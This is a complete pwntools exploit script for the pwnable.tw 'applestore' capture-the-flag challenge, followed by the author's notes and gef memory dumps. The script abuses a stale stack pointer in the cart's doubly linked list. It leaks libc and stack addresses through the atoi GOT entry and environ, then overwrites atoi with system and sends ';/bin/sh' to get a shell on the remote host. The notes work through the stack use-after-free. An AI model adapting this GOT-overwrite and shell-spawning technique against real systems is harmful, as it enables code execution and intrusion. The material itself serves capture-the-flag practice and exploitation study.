

#!/usr/bin/env python3
from pwn import *
from sys import argv
context(arch='amd64',os='linux',log_level='DEBUG')
binary=ELF("./applestore",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    libc=ELF("libc_32.so.6",checksec=False)
    p=remote("chall.pwnable.tw", 10104)
else:
    libc=ELF("/usr/lib32/libc.so.6",checksec=False)
    p=process("./applestore")
s=lambda x,r="":p.sendlineafter(r,x) if r else p.sendline(x)
recvu=lambda r="":p.recvuntil(r)

apple_store=lambda:s("1", ">")
add=lambda d_num:(success("add: %s"%d_num),s("2"),s(str(d_num),"Number>"))
remove=lambda i_num:(success("remove: %s"%i_num),s("3",">"),s(i_num,"Number>"))
list=lambda:(s("4",">"),s("y",") > "))
checkout=lambda:(s("5",">"),s("y", ") >"))
exit=lambda:s("6",">")

craft_fake=lambda name,price,fd=0,bk=0:(p32(name)+p32(price)+p32(fd)+p32(bk)+p32(0))

for i in range(16):
    add(1)
for i in range(5):
    add(2)
for i in range(5):
    add(3)

#p.interactive()
pause()

checkout()
s("4","> ")

# we are overwriting the iphone 8 structure with 2 bytes being ebp-0x22 til 0x20.
# overwrite name pointer which in this case we want to populated GOT entry of atoi
# then, we overwrite the price, fd, and bk of the structure so there are no crashes.
s(b"y\x00" + craft_fake(binary.got['atoi'], 1), ") >")
recvu("27: ")
base = int.from_bytes(p.recvline().split(b" -")[0], "little") - libc.symbols['atoi']
print("Base address of libc: %s"%hex(base))

s("4","> ")
s(b"y\x00" + craft_fake(libc.symbols['environ']+base, 1), ") > ")
recvu("27: ")
stack = int.from_bytes(p.recvline().split(b" -")[0],"little")-260
print("Base pointer address: %s"%hex(stack))

remove(b"27"+p32(0x08049002)+p32(0)+p32(binary.got['atoi']+0x22)+p32(stack-0x8))

s(p32(libc.symbols['system']+base) + b";/bin/sh\x00", b">")

p.interactive()

"""
is this a doubly linked list of shopping items?
yea seems like it, in insert function there are fd and bk pointers. 32 bit addressing mode so ptrs
are 4 bytes

cart() function shows all cart items and returns total price.

i dont know if this is a vulnerability, but it is inserting a local stack variable into the doubly linked
cart list within the discount iphone 8

(199*16) + (299*5) + (499*5) = 7174

we get a discount :)

once we get discount, pointer to stack still valid since still within same frame
ebp and co. has not been deallocated yet, so we can overwrite with sym.cart?

also, this is an x86 binary with 32 bit addressing mode, so decompilation thinks that all pointers
are 32 bit integers. They are the same size in len, so i guess there really is no efficient way to
tell. But just something to remember since it looked a bit confusing at first.

we have the ability to write onto the stack, albeit a very controlled fasion with the use of the
cart functionality, in which it will ask if they are allowed to view our cart.

since this has implemented a linked list, i wonder if this will be a cool unlink attack?

when we add the iphone 8 1 dollar discount into the cart, then attempt to iterate through linked list
to read. It will seg fault after writing junk to stdout. I assume that we are reading from the stack 
until vfprintf decides it doesnt like the memory its reading anymore and decides to die.

we know this is a doubly linked list from the removal of a node from the list, so can we perform an
unlink attack? i guess a singly linked list would also be vulnerable to corruption.

We can overwrite the structure with the my_read function. This means that whatever address we
write, it will dereference and use as the original iPhone 8 string. We can write an address to a
resolved GOT entry and it will dereference, and write to stdout.

We leak libc like this

Vuln goes like this.
Stack object of iphone 8 is accidentally allocated at ebp-0x20, or at least thats where it places the
object. it will call asprintf on ebp-0x20 within checkout()'s stack frame. The thing that confuses
me is that my_read function is not supposed to overwrite the object since they dont share the same
stack frame??

each new function called will save pointer to old stack through pushing bp and allocate a new
frame as to not tamper with previous stacks memory. the my_read function should only be able to write
into its own stack frame. so what is happening?

is this a use after free of a stack frame??

using a stack pointer after its original stack has been deallocated and a new one allocated. the
doubly linked list knows only of pointers to addresses? is this possible?

yes, this is a uaf on a old stack frame. the stale pointer points to memory that does not exist, but
if a stack frame is currently on that memory, then that pointer will point to the current memory
rather than the previous


gef➤
0x9194a00:      0x6f685069      0x3620656e      0x756c5020      0x00000073
0x9194a10:      0x00000000      0x00000000      0x00000000      0x00000021
0x9194a20:      0x09194a40      0x0000012b      0x09194a60      0x091949e0
0x9194a30:      0x00000000      0x00000000      0x00000000      0x00000021
0x9194a40:      0x6f685069      0x3620656e      0x756c5020      0x00000073
0x9194a50:      0x00000000      0x00000000      0x00000000      0x00000021
0x9194a60:      0x09194a80      0x000001f3      0x09194a90      0x09194a20
0x9194a70:      0x00000000      0x00000000      0x00000000      0x00000011
0x9194a80:      0x64615069      0x72694120      0x00003220      0x00000021
0x9194a90:      0x09194ab0      0x000001f3      0x09194ac0      0x09194a60
gef➤
0x9194aa0:      0x00000000      0x00000000      0x00000000      0x00000011
0x9194ab0:      0x64615069      0x72694120      0x00003220      0x00000021
0x9194ac0:      0x09194ae0      0x000001f3      0x09194af0      0x09194a90
0x9194ad0:      0x00000000      0x00000000      0x00000000      0x00000011
0x9194ae0:      0x64615069      0x72694120      0x00003220      0x00000021
0x9194af0:      0x09194b10      0x000001f3      0x09194b20      0x09194ac0
0x9194b00:      0x00000000      0x00000000      0x00000000      0x00000011
0x9194b10:      0x64615069      0x72694120      0x00003220      0x00000021
0x9194b20:      0x09194b40      0x000001f3      0xffeb2158      0x09194af0
0x9194b30:      0x00000000      0x00000000      0x00000000      0x00000011
gef➤
0x9194b40:      0x64615069      0x72694120      0x00003220      0x00000011
0x9194b50:      0x6f685069      0x3820656e      0x00000000      0x000214a9
0x9194b60:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194b70:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194b80:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194b90:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194ba0:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194bb0:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194bc0:      0x00000000      0x00000000      0x00000000      0x00000000
0x9194bd0:      0x00000000      0x00000000      0x00000000      0x00000000
gef➤  x/x 0xffeb2158
0xffeb2158:     0x0804b040
gef➤  x/x 0x0804b040
0x804b040 <atoi@got.plt>:       0xf7d0bc10
gef➤  grep 0x0804b040
[+] Searching '\x40\xb0\x04\x08' in memory
[+] In '/home/manjoos/Downloads/applestore/applestore'(0x8048000-0x804a000), permission=r-x
  0x8048450 - 0x8048460  →   "\x40\xb0\x04\x08[...]"
  0x8048562 - 0x8048572  →   "\x40\xb0\x04\x08[...]"
[+] In '[stack]'(0xffe93000-0xffeb4000), permission=rw-
  0xffeb2158 - 0xffeb2168  →   "\x40\xb0\x04\x08[...]"
gef➤  x/x 0xffeb2158
0xffeb2158:     0x0804b040
gef➤  x/x  $ebp
0xffeb2128:     0xffeb2178
gef➤  0xffeb2158

last linked list entry is the previous stale stack pointer to the old object. Within the stack
frame of my_read for the cart() function, it will initialize and create a stack frame within the
bounds of the previous frame that the heap pointer, points to.

We can see that the base address of the current read function is 0xffeb2178. We are writing to
ebp-0xc with our read() function.

this is such a strange challenge. what the heck.

okay, so general overview of what just happened
stack pointer being inserted into doubly linked list with stack junk being inserted as parameters
to our iPhone 8.

Then, it will deallocate the subroutine stack, but the pointer within the linked list will still
exist. Then, within the my_read functionality, the stack frame lines up perfectly for us to overwrite
the data that the doubly linked list points to.

In reality, when a stack is being deallocated, the memory is not being cleared, it is only forgotten
by the stack and base registers. id assume this is what happens with uninitialized stack values? it
creates a pointer to an offset on the stack but does not check to see what values are already at that
address.

Interesting, i learned something new about the stack today :D

ah yea and this was possible since handler runs on a while loop, the previous base address will
always be static which allows us to tamper with the temporary stack that has been deallocated. this
is so cool :DDDDD

The next vulnerability here has been demonstrated with the pwnable.kr's simple login.
"""


